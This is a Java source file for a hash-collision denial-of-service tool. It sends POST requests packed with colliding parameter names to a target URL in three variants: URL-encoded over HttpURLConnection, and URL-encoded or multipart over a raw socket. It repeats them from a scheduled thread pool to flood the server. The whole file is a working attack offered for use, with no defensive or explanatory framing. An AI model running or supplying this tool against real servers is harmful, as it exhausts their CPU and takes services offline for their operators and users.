import java.io.IOException;
import java.io.OutputStream;
import java.lang.reflect.Method;
import java.net.HttpURLConnection;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.URL;
import java.net.URLEncoder;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;


public class Post {
	void doHashDos(String url, int keyCount, int valueLength) throws Exception {
		
		HashCollide collide = new HashCollide(77, 7, 31);
		StringBuffer sb = new StringBuffer();
		for (int i = 0; i < keyCount; ++i) {
			String a = collide.randomString(12);
            String b = collide.collide(a, 12345678);
            
            sb.append(URLEncoder.encode(b, "iso-8859-1"))
              .append("=")
              .append(URLEncoder.encode(collide.randomString(valueLength), "iso-8859-1"))
              .append("&");
		}
		byte[] bytes = sb.toString().getBytes();
		System.out.println("POST: key count="+keyCount+ " value length="+valueLength+ " size=" + bytes.length);
		
		HttpURLConnection connection = (HttpURLConnection) new URL(url).openConnection();
		
		connection.setRequestMethod("POST");
		connection.setDoOutput(true);
		
		connection.getOutputStream().write(bytes, 0, bytes.length);
		connection.getOutputStream().flush();
		connection.getOutputStream().close();
		
        System.out.println("RESP: " + connection.getResponseCode());
	}
	
	void doHashDos2(String url, int keyCount, int valueLength) throws Exception {
		URL u = new URL(url);
		String host = u.getHost();
		int port = u.getPort() == -1 ? 80 : u.getPort();
		String path = u.getPath();
		
		HashCollide collide = new HashCollide(77, 7, 31);
		StringBuffer hb = new StringBuffer();
		for (int i = 0; i < keyCount; ++i) {
			String a = collide.randomString(12);
            String b = collide.collide(a, 12345678);
            
            hb.append(URLEncoder.encode(b, "iso-8859-1"))
            .append("=")
            .append(URLEncoder.encode(collide.randomString(valueLength), "iso-8859-1"))
            .append("&");
		}
		byte[] data = hb.toString().getBytes();
		int len = data.length;
		
		System.out.println("POST: key count="+keyCount+ " value length="+valueLength+ " size=" + len);
		
		Socket socket = new Socket();
		socket.connect(new InetSocketAddress(host, port));
		
		OutputStream out = socket.getOutputStream();
		writeLine(out, "POST " + path + " HTTP/1.0");
		writeLine(out, "Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, application/x-ms-application, application/x-ms-xbap, application/vnd.ms-xpsdocument, application/xaml+xml, */*");
		writeLine(out, "Accept-Language: zh-cn");
		writeLine(out, "Content-Type: application/x-www-form-urlencoded");
		//writeLine(out, "Accept-Encoding: gzip, deflate");
		writeLine(out, "User-Agent: Java-hash-dos");
		writeLine(out, "Host: " + host);
		writeLine(out, "Content-Length: "+ len + "");
		writeLine(out, "Connection: Close");
		writeLine(out, "Cache-Control: no-cache");
		writeLine(out, "");
		writeLine(out, hb.toString());
		writeLine(out, "");
		out.flush();
		out.close();
		
		socket.close();
	}
	
	void doHashDos3(String url, int keyCount, int valueLength) throws Exception {
		URL u = new URL(url);
		String host = u.getHost();
		int port = u.getPort() == -1 ? 80 : u.getPort();
		String path = u.getPath();
		
		HashCollide collide = new HashCollide(77, 7, 31);
		StringBuffer sb = new StringBuffer();
		for (int i = 0; i < keyCount; ++i) {
			String a = collide.randomString(12);
            String b = collide.collide(a, 12345678);
            sb.append("-----------------------------7dc30d14406c0\r\n");
            sb.append("Content-Disposition: form-data; name=\"").append(b).append("\"\r\n");
            sb.append("\r\n");
            sb.append(collide.randomString(valueLength) + "\r\n");
		}
		sb.append("-----------------------------7dc30d14406c0--");
		byte[] data = sb.toString().getBytes();
		int len = data.length;
		System.out.println("POST: key count="+keyCount+ " value length="+valueLength+ " size=" + len);
		
		Socket socket = new Socket();
		socket.connect(new InetSocketAddress(host, port));
		
		OutputStream out = socket.getOutputStream();
		writeLine(out, "POST " + path + " HTTP/1.0");
		writeLine(out, "Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, application/x-ms-application, application/x-ms-xbap, application/vnd.ms-xpsdocument, application/xaml+xml, */*");
		writeLine(out, "Accept-Language: zh-cn");
		writeLine(out, "Content-Type: multipart/form-data; boundary=---------------------------7dc30d14406c0");
		writeLine(out, "User-Agent: Java-hash-dos");
		writeLine(out, "Host: " + host);
		writeLine(out, "Content-Length: "+ len + "");
		writeLine(out, "Connection: Close");
		writeLine(out, "Cache-Control: no-cache");
		writeLine(out, "");
		// HERE //
		out.write(data);
		// HERE //
		writeLine(out, "");
		out.flush();
		out.close();
		socket.close();
		
	}
	
	
	private void writeLine(OutputStream out, String text) throws IOException {
		String line = text.concat("\r\n");
		byte[] bytes = line.getBytes();
		out.write(bytes, 0, bytes.length);
	}
	
	public static void main(final String[] args) throws Exception {
		if(args.length < 4) {
			System.err.println("Usage: Post [method] [url] [keyCount] [valueLength]");
			System.err.println("\tmethod was: doHashDos|doHashDos2|doHashDos3");
			return;
		}
		
		Runnable r = new Runnable(){
			@Override
			public void run() {
				Post p = new Post();
				try {
					Method m = Post.class.getDeclaredMethod(args[0], String.class, int.class, int.class);
					m.invoke(p, args[1], Integer.parseInt(args[2]), Integer.parseInt(args[3]));
				} catch (Exception e) {
					e.printStackTrace();
				}
			}
			
		};
		hashDos(r);
		
	}
	
	static void hashDos(Runnable r) throws InterruptedException {
		ScheduledExecutorService pool = Executors.newScheduledThreadPool(4);
		pool.scheduleAtFixedRate(r, 1, 1, TimeUnit.SECONDS);
		pool.scheduleAtFixedRate(r, 2, 1, TimeUnit.SECONDS);
		pool.scheduleAtFixedRate(r, 3, 1, TimeUnit.SECONDS);
		pool.scheduleAtFixedRate(r, 4, 1, TimeUnit.SECONDS);
		pool.scheduleAtFixedRate(r, 5, 1, TimeUnit.SECONDS);
		pool.scheduleAtFixedRate(r, 6, 1, TimeUnit.SECONDS);
		pool.scheduleAtFixedRate(r, 7, 1, TimeUnit.SECONDS);
		pool.scheduleAtFixedRate(r, 8, 1, TimeUnit.SECONDS);
		pool.awaitTermination(60, TimeUnit.SECONDS);
	}
	
}
